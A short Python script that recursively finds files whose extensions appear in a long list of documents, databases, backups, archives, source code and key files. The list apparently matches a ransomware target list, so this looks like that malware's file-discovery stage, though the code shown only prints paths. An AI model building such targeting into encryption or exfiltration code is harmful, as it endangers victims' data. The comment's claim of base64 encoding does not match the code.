
import os

# return the base64 encoded path of the files
def find_files(path):
    file_format = ['doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'pst', 'ost', 'msg', 'eml', 'vsd', 'vsdx',\
                    'txt', 'csv', 'rtf', 'wks', 'wk1', 'pdf', 'dwg', 'onetoc2', 'snt', 'jpeg', 'jpg',\
                    'docb', 'docm', 'dot', 'dotm', 'dotx', 'xlsm', 'xlsb', 'xlw', 'xlt', 'xlm', 'xlc',\
                    'xltx', 'xltm', 'pptm', 'pot', 'pps', 'ppsm', 'ppsx', 'ppam', 'potx', 'potm',\
                    'edb', 'hwp', '602', 'sxi', 'sti', 'sldx', 'sldm', 'sldm', 'vdi', 'vmdk', 'vmx', 'gpg',\
                    'aes', 'ARC', 'PAQ', 'bz2', 'tbk', 'bak', 'tar', 'tgz', 'gz', '7z', 'rar', 'zip',\
                    'backup', 'iso', 'vcd', 'bmp', 'png', 'gif', 'raw', 'cgm', 'tif', 'tiff', 'nef',\
                    'psd', 'ai', 'svg', 'djvu', 'm4u', 'm3u', 'mid', 'wma', 'flv', '3g2', 'mkv', '3gp',\
                    'mp4', 'mov', 'avi', 'asf', 'mpeg', 'vob', 'mpg', 'wmv', 'fla', 'swf', 'wav', 'mp3',\
                    'sh', 'class', 'jar', 'java', 'rb', 'asp', 'php', 'jsp', 'brd', 'sch', 'dch',\
                    'dip', 'pl', 'vb', 'vbs', 'ps1', 'bat', 'cmd', 'js', 'asm', 'h', 'pas', 'cpp', 'c',\
                    'cs', 'suo', 'sln', 'ldf', 'mdf', 'ibd', 'myi', 'myd', 'frm', 'odb', 'dbf', 'db','mdb',\
                    'accdb', 'sql', 'sqlitedb', 'sqlite3', 'asc', 'lay6', 'lay', 'mml', 'sxm', 'otg', 'odg', 'uop',\
                    'std', 'sxd', 'otp', 'odp', 'wb2', 'slk', 'dif', 'stc', 'sxc','ots', 'ods', '3dm', 'max', '3ds',\
                    'uot', 'stw', 'sxw', 'ott', 'odt', 'pem', 'p12', 'csr', 'crt', 'key', 'pfx', 'der']

    files = []
    for actual_path, directories, files_found in os.walk(path):
        for arq in files_found:
            extensao = os.path.splitext(os.path.join(actual_path, arq))[1].replace('.', '')
            if(extensao in file_format):
                encoded_path = os.path.join(actual_path, arq)
                files.append(encoded_path)

    return files

if __name__ == '__main__':
    print(find_files('.'))

